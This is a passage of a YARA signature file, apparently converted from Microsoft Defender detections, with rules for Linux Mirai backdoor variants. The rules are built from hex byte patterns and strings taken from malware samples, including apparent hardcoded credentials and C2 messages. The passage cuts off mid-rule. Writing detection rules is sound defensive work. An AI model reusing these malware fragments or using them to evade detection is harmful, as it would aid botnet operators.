            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_QY_2147903272_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.QY!MTB"
        threat_id = "2147903272"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {02 80 00 04 90 06 e0 28 03 00 00 10 c2 36 e0 06 c6 17 bf d6}  //weight: 1, accuracy: High
        $x_1_2 = {32 80 00 05 83 30 a0 10 c2 0e 40 00 b4 06 80 01 83 30 a0 10 07 00 00 3f 86 10 e3 ff}  //weight: 1, accuracy: High
        $x_1_3 = {86 10 20 00 80 a0 c0 0b 32 80 00 05 90 02 20 01 81 c3 e0 08 90 10 20 01 90 02 20 01}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_QZ_2147903273_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.QZ!MTB"
        threat_id = "2147903273"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {d8 f6 12 0f cf ff 08 72 fc 13 03 b0 40 a3 e0 78 e0 78 fc 13 02 b0 44 6a fc 1b 80 b0 e0 78 e0 78 f8 13 02 b0 42 22 02 01 f8 1b 80 b0 30 f0 e0 78 e0 78}  //weight: 1, accuracy: High
        $x_1_2 = {09 f4 ec 13 02 b0 40 82 61 6a ec 13 02 b0 60 a2 e0 78}  //weight: 1, accuracy: High
        $x_1_3 = {e0 78 fc 13 02 b0 41 6a fc 1b 80 b0 e0 78 e0 78 f8 13 02 b0 61 6a f8 1b c0 b0 e0 78 e0 78 40 8a 4b 7a f0 f5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_QW_2147903274_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.QW!MTB"
        threat_id = "2147903274"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0c 20 d4 e7 00 30 d0 e5 02 00 53 e1 01 c0 8c e2 00 c0 a0 13 03 00 00 1a 0e 00 5c e1 01 00 00 1a 01 00 a0 e3 10 80 bd e8 01 00 80 e2 01 10 51 e2 f2 ff ff 2a}  //weight: 1, accuracy: High
        $x_1_2 = {e1 ff ff eb 04 40 94 e5 04 30 94 e5 00 00 53 e3 04 00 a0 e1 f9 ff ff 1a}  //weight: 1, accuracy: High
        $x_1_3 = {04 30 d2 e7 00 00 53 e3 41 30 83 02 04 30 c2 07 01 20 82 e2 00 00 52 e1 10 80 bd 08 f7 ff ff ea 00 20 a0 e3 f5 ff ff ea}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_QE_2147903275_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.QE!MTB"
        threat_id = "2147903275"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 3d 00 00 2f 89 00 2e 41 9e 03 14 2f 89 00 00 41 9e 03 0c 38 0a 00 01 99 2b 00 00 54 0a 06 3e 39 6b 00 01 3b bd 00 01 42 00 ff d8}  //weight: 1, accuracy: High
        $x_1_2 = "beardropper" ascii //weight: 1
        $x_1_3 = "t0talc0ntr0l4!" ascii //weight: 1
        $x_1_4 = "wabjtam" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_QX_2147904436_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.QX!MTB"
        threat_id = "2147904436"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {eb 08 8b 44 24 0c 66 c1 c8 08 66 89 46 02}  //weight: 1, accuracy: High
        $x_1_2 = {c7 02 ff ff ff ff 8d 84 24 ec 2e 00 00 c7 42 04 00 00 00 00 c7 42 08 00 00 00 00 83 c2 0c 39 c2 75 de}  //weight: 1, accuracy: High
        $x_1_3 = {e8 a6 ff ff ff 83 eb 04 89 06 83 c6 04 eb 1f 83 fb 01}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EN_2147904636_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EN!MTB"
        threat_id = "2147904636"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {7f 69 fe 70 7f c3 f3 78 7d 20 da 78 7c 00 48 50 7c 00 fe 70 7f bd 00 38 4b ff fc 31 3b e3 00 01 7f 9f e8 40 40 9d 00 0c 7f bf eb 78 3b 80 00 22}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EO_2147904934_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EO!MTB"
        threat_id = "2147904934"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {55 69 04 3e 55 60 84 3e 7c 00 4a 14 54 ea 04 3e 89 63 00 09 54 e9 84 3e 7d 28 4a 14 7c 00 52 14 7d 29 5a 14 7c 00 2a 14 7c 09 02 14 54 09 84 3f 41 82 00 14}  //weight: 1, accuracy: High
        $x_1_2 = {81 23 00 00 7c 0a 48 ae 7c c0 02 78 7c 0a 49 ae 81 63 00 00 7c 0a 58 ae 7c e0 02 78 7c 0a 59 ae 81 23 00 00 7c 0a 48 ae 7d 00 02 78 7c 0a 49 ae 81 63 00 00 7c 0a 58 ae 7c a0 02 78 7c 0a 59 ae 39 4a 00 01 a0 03 00 04 7f 80 50 00 41 9d ff b4}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EV_2147905477_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EV!MTB"
        threat_id = "2147905477"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {ba 40 42 0f 00 89 f8 48 83 ec 18 89 d1 31 d2 48 89 e7 f7 f1 31 f6 89 d2 89 c0 48 69 d2 e8 03 00 00 48 89 04 24 48 89 54 24 08}  //weight: 1, accuracy: High
        $x_1_2 = {48 89 fe e8 0a 09 00 00 89 c5 85 ed 74 ?? 31 c0 48 81 bc 24 a8 01 00 00 ff 64 cd 1d 0f 9f c0 03 84 24 a0 01 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FC_2147905478_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FC!MTB"
        threat_id = "2147905478"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {92 42 00 04 8e 43 00 00 26 52 00 05 a0 a2 00 14 ac a3 00 04 ac a3 00 10 a4 a6 00 00 16 ?? ?? ?? 24 a5 00 18 02 d7 10 21 02 22 10 23 24 54 ff fa}  //weight: 1, accuracy: Low
        $x_1_2 = {00 80 28 21 02 a4 10 21 80 43 00 20 00 00 00 00 10 ?? ?? ?? 24 02 00 20 10 ?? ?? ?? 24 82 00 01 02 42 10 21 10 ?? ?? ?? 24 06 00 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FH_2147905479_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FH!MTB"
        threat_id = "2147905479"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {92 42 00 00 10 ?? ?? ?? a2 62 00 04 92 50 00 01 26 73 00 08 03 d0 10 2a 26 04 00 01 14 ?? ?? ?? 02 d0 ?? 21 03 20 f8 09 03 d0 88 23 8f bc 00 18 00 40 20 21}  //weight: 1, accuracy: Low
        $x_1_2 = {92 03 00 04 8e 02 00 00 a4 a8 ff e8 26 10 00 05 ac a2 ff ec a0 83 ff fc ac 82 ff f8 00 f5 10 2a 24 c6 00 18 24 e7 00 01 24 84 00 18 14 ?? ?? ?? 02 86 28 21 02 51 10 21 00 50 18 23}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_ER_2147905480_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.ER!MTB"
        threat_id = "2147905480"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {21 00 00 3f 92 10 00 1b 96 14 23 ff d0 2f be cf 94 10 20 03}  //weight: 1, accuracy: High
        $x_1_2 = {05 00 00 3f a3 30 60 10 ac 10 a3 ff 82 10 20 00 a5 37 60 10 83 28 60 02 d4 07 be b8 a7 3d e0 18 e0 02 80 01 80 a4 80 16 02 80 ?? ?? b6 04 20 14}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EW_2147905481_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EW!MTB"
        threat_id = "2147905481"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3c 00 cc cc 7d 23 48 50 60 00 cc cd 7d 29 01 d6 7f 4b d3 78 39 40 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {1c 19 ff fb 3a e0 00 00 7d 3d 02 14 2f 89 00 06 41 ?? ?? ?? 8a c7 00 06 2f 96 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FG_2147905482_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FG!MTB"
        threat_id = "2147905482"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {c2 49 00 08 80 a0 60 00 32 bf ff fe 88 01 20 01 c2 4a 40 00 80 a0 60 00 02 ?? ?? ?? 84 10 20 00 84 00 a0 01}  //weight: 1, accuracy: Low
        $x_1_2 = {c4 0a 00 00 c6 0a 80 04 82 00 bf bf 92 02 7f ff 82 08 60 ff 88 01 20 01 80 a0 60 19 18 ?? ?? ?? ?? 02 20 01 84 10 a0 60}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EU_2147905483_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EU!MTB"
        threat_id = "2147905483"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4b ff fe 6d 3d 60 10 02 3d 20 00 00 80 0b e0 10 39 29 00 00 38 6b e0 10 2f 80 00 00 41 ?? ?? ?? 2f 89 00 00 41 9e 00 0c 7d ?? ?? ?? 4e 80 04 21 80 01 00 14 38 21 00 10 7c 08 03 a6 4e 80 00 20}  //weight: 1, accuracy: Low
        $x_1_2 = {80 09 00 00 38 89 00 04 2f 80 00 00 40 ?? ?? ?? 7c 9d 23 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_QJ_2147905556_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.QJ!MTB"
        threat_id = "2147905556"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {10 00 00 02 ae 22 00 10 ae 23 00 10 26 62 00 08}  //weight: 1, accuracy: High
        $x_1_2 = {14 a2 00 0b 00 00 00 00 24 e7 00 01 14 e5 00 0b 00 00 28 21 03 a6 10 21 80 43 00 39 24 02 00 41 14 62 00 0c 03 a6 10 21 10 00 00 0a 24 08 00 01 10 00 00 02}  //weight: 1, accuracy: High
        $x_1_3 = {10 00 00 07 00 a2 20 21 15 00 00 05 24 84 00 01 8c c2 00 00 00 00 00 00 24 42 00 01 ac c2 00 00 90 82 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HB_2147906021_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HB!MTB"
        threat_id = "2147906021"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {c2 00 a0 10 c2 24 20 10 82 10 20 08 c0 28 e0 0d c2 28 e0 0c c2 04 20 26 82 08 40 0c 82 10 40 0b 82 08 40 0d 82 10 40 0a c2 24 20 26 82 04 a0 1c 80 a1 20 00 c2 36 e0 02 fa 2e e0 01 82 38 00 14 ee 2e e0 08 02 80 00 04 c2 36 e0 04 03 00 00 10 c2 36 e0 06 82 10 20 11}  //weight: 1, accuracy: High
        $x_1_2 = {82 04 60 08 c2 36 a0 04 c2 17 bf ce c4 17 bf c6 c2 36 a0 02 c4 36 80 00 c2 07 bf f4 82 00 60 01 c2 27 bf f4 e0 07 bf f4 ac 0e 20 ff 92 10 20 04 80 a4 00 16 06 bf ff a2 90 10 25 e6 10 80 00 8c c0 27 bf f4}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GD_2147906022_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GD!MTB"
        threat_id = "2147906022"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8f 82 80 70 8f 99 80 70 10 40 00 04 00 00 00 00 8f bf 00 18 03 20 00 08 27 bd 00 20 8f bf 00 18 00 00 00 00 03 e0 00 08 27 bd 00 20}  //weight: 1, accuracy: High
        $x_1_2 = {16 60 00 07 02 00 10 21 8f 99 88 b4 27 a4 00 20 03 20 f8 09 24 05 00 01 8f bc 00 10 02 00 10 21 8f bf 00 40 8f b3 00 3c 8f b2 00 38 8f b1 00 34 8f b0 00 30 03 e0 00 08 27 bd 00 48}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FN_2147906072_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FN!MTB"
        threat_id = "2147906072"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {18 30 a0 e3 92 a3 28 e0 00 30 d4 e5 b0 30 c3 e3 40 30 83 e3 00 30 c4 e5 09 e8 a0 e1 00 30 d4 e5 42 c8 8e e2 2c 24 a0 e1}  //weight: 1, accuracy: High
        $x_1_2 = {05 00 51 e1 05 10 a0 21 00 30 d6 e5 0a 00 53 e3 01 60 86 e2 00 30 c2 e5 02 ?? ?? ?? b0 30 d4 e1 01 0c 13 e3}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FP_2147906073_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FP!MTB"
        threat_id = "2147906073"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 10 95 e5 34 30 91 e5 00 00 53 e3 08 ?? ?? ?? 10 20 91 e5 18 30 91 e5 03 00 52 e1 01 00 d2 34 10 20 81 35 04 ?? ?? ?? 01 00 a0 e1 9a 04 00 eb}  //weight: 1, accuracy: Low
        $x_1_2 = {f0 45 2d e9 8d 70 a0 e3 04 d0 4d e2 00 00 00 ef 01 0a 70 e3 00 50 a0 e1 06 ?? ?? ?? 78 30 9f e5 00 20 60 e2 03 30 9f e7}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FS_2147906074_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FS!MTB"
        threat_id = "2147906074"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {95 31 20 08 9a 10 40 0d 99 36 20 08 92 53 40 1a 91 40 00 00 85 3e a0 1f 96 82 40 0a 82 5b 00 1a 84 58 80 0d 82 00 40 02 ?? 00 40 08 03 00 3f ff 94 42 20 00 82 10 63 ff 80 a2 80 01}  //weight: 1, accuracy: Low
        $x_1_2 = {d4 22 60 08 80 a2 a0 00 02 ?? ?? ?? d6 22 60 04 10 ?? ?? ?? d2 22 a0 04 d2 22 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EQ_2147906080_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EQ!MTB"
        threat_id = "2147906080"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {9c 50 9f e5 9c 30 9f e5 05 50 8f e0 03 40 95 e7 94 30 9f e5 ?? ?? ?? ?? 03 10 95 e7 04 20 a0 e1 88 30 9f e5 00 60 a0 e1 0d 00 a0 e1 03 c0 95 e7 0f e0 a0 e1 ?? ?? ?? ?? 74 30 9f e5 04 00 a0 e1 03 c0 95 e7 0f e0 a0 e1 1c ff 2f e1 64 30 9f e5 03 20 95 e7 02 30 a0 e1 00 00 53 e3 06 00 a0 11 0f e0 a0 11 12 ff 2f 11 4c 30 9f e5 0d 00 a0 e1 01 10 a0 e3 ?? ?? ?? ?? 0f e0 a0 e1 ?? ?? ?? ?? ad 04 00 eb 34 30 9f e5 03 20 85 e0 02 30 a0 e1 00 00 53 e3 0f e0 a0 11 12 ff 2f 11 06 00 a0 e1 53 06 00 eb}  //weight: 1, accuracy: Low
        $x_1_2 = {00 30 d3 05 04 28 a0 e1 0c c0 83 00 0e 38 a0 e1 22 28 a0 e1 23 38 a0 e1 02 30 83 e0 24 38 83 e0 2e 38 83 e0 05 30 83 e0 09 20 d0 e5 0c 30 83 e0 02 04 83 e0 02 00 00 ea}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FB_2147906200_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FB!MTB"
        threat_id = "2147906200"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {43 02 00 eb 00 08 a0 e1 07 10 a0 e1 20 08 a0 e1 e8 16 00 eb 00 08 a0 e1 20 3c a0 e1 07 30 c5 e5 8d 3e 8d e2 20 08 a0 e1 08 30 83 e2 04 20 86 e0 06 00 c5 e5 03 20 82 e0 d3 20 42 e2 03 10 d2 e5 02 30 d2 e5 01 34 83 e1 00 00 53 e1}  //weight: 2, accuracy: High
        $x_2_2 = {24 32 9f e5 03 30 91 e7 00 40 83 e5 2f 10 a0 e3 00 00 90 e5 5a 08 00 eb 10 32 9f e5 00 50 9d e5 00 00 50 e3 03 20 95 e7 01 30 80 12 00 00 82 e5 00 30 82 15 00 40 82 05}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_GA_2147906203_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GA!MTB"
        threat_id = "2147906203"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "tmp/condinetwork" ascii //weight: 5
        $x_1_2 = "condibot" ascii //weight: 1
        $x_1_3 = "var/zxcr9999" ascii //weight: 1
        $x_1_4 = "trytocrack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_GE_2147906205_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GE!MTB"
        threat_id = "2147906205"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {4e 56 ff dc 2f 02 20 2e 00 08 58 80 2d 40 00 08 2f 2e 00 10 61 ff 00 00 15 40 58 8f 20 0e 50 80 2f 00 2f 2e 00 0c 61 ff 00 00 06 ce 50 8f 20 08 2d 40 ff f0 2f 2e 00 10 61 ff 00 00 15 1c 58 8f 4a ae ff f0 57 c0 12 00 49 c1 2d 41 ff dc 20 2e ff dc 44 80}  //weight: 1, accuracy: High
        $x_1_2 = {2d 6e ff e6 ff ea 2d 7c 7e fe fe ff ff f2 42 81 12 2e ff fb 42 80 10 2e ff fb e1 88 80 81 2d 40 ff f6 20 2e ff f6 48 40 42 40 81 ae ff f6}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JY_2147906251_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JY!MTB"
        threat_id = "2147906251"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {75 28 8b 44 24 38 2b 46 f8 83 f8 1e 0f 87 18 04 00 00 8b 46 f0 89 c2 83 e0 1f c1 ea 05 0f ab 84 94 78 50 00 00 e9 f0 03 00 00 3c 04}  //weight: 1, accuracy: High
        $x_1_2 = {e8 e9 f6 ff ff 0f b7 c0 89 44 24 04 8b 44 24 04 66 c1 c8 08 66 3d ff 03 76 e6}  //weight: 1, accuracy: High
        $x_1_3 = "lost connection with CNC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FX_2147906252_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FX!MTB"
        threat_id = "2147906252"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {05 00 a0 e1 7c ff ff eb 07 00 a0 e1 7a ff ff eb 38 10 9f e5 04 20 a0 e3 01 00 a0 e3 8b ff ff eb 05 00 a0 e3 70 ff ff eb 94 d0 8d e2 f0 81 bd e8}  //weight: 1, accuracy: High
        $x_1_2 = {8a ff ff 1b 93 30 dd e5 04 44 83 e1 7c 30 9f e5 03 00 54 e1 f3 ?? ?? ?? 0d 10 a0 e1 80 20 a0 e3 05 00 a0 e1 a1 ff ff eb 00 20 50 e2 0d 40 a0 e1 0d 10 a0 e1}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GF_2147906253_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GF!MTB"
        threat_id = "2147906253"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 31 f6 53 48 89 fb 48 83 ec 08 e8 e5 e7 ff ff 48 8b 6b 10 48 89 df 48 c7 43 10 00 00 00 00 e8 7b e8 ff ff eb ?? 48 8b 5d 10}  //weight: 1, accuracy: Low
        $x_1_2 = {e8 a9 ff ff ff 48 89 44 24 10 48 8b 74 24 10 4c 89 e7 e8 3d e7 ff ff ?? ?? ?? ?? ?? 48 89 de e8 83 fe ff ff 4c 89 e7 89 c3 e8 d0 e7 ff ff 89 d8 48 83 c4 18 5b 41 5c c3}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GJ_2147906254_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GJ!MTB"
        threat_id = "2147906254"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {f0 35 9f e5 02 00 5c e1 03 30 98 e7 00 c0 a0 23 1c 10 a0 e3 9c 31 23 e0 64 c0 8d e5 68 c0 9d e5 01 20 8c e2 10 00 9d e5 02 28 a0 e1 22 28 a0 e1 68 20 8d e5 0c 10 9d e5 b0 20 88 e1 64 20 9d e5 01 20 88 e7 03 e0 a0 e1 0f 00 be e8}  //weight: 1, accuracy: High
        $x_1_2 = {1c 00 90 e5 04 10 a0 e1 a9 04 00 eb 00 00 55 e3 44 51 84 e5 1c 00 94 05 f9 04 00 0b 04 d0 8d e2 30 40 bd e8 1e ff 2f e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GO_2147906255_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GO!MTB"
        threat_id = "2147906255"
